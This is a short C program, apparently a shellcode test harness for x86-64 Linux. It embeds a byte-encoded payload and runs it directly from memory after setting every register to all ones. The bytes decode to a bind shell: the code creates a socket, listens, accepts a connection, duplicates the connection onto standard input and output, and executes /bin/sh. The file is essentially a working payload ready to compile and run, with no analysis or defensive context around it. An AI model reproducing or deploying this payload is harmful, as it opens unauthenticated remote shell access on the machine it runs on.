#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x6a\x01\x6a\x02\x6a\x29\x58\x5f\x5e\x99\x0f\x05\xff\xce\x97\x04\x30\x0f\x05\x04\x2b\x0f\x05\x97\xff\xc8\x40\xb6\x21\x96\x0f\x05\x75\xf6\x48\xbb\xd0\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xd3\x53\x48\x89\xe7\x04\x3b\x0f\x05";

int main ()
{

    // When contains null bytes, printf will show a wrong shellcode length.

    printf("Shellcode Length:  %d\n", strlen(code));

    // Pollutes all registers ensuring that the shellcode runs in any circumstance.

    __asm__ ("mov $0xffffffffffffffff, %rax\n\t"
         "mov %rax, %rbx\n\t"
         "mov %rax, %rcx\n\t"
         "mov %rax, %rdx\n\t"
         "mov %rax, %rsi\n\t"
         "mov %rax, %rdi\n\t"
         "mov %rax, %rbp\n\t"

    // Calling the shellcode
         "call code");

}
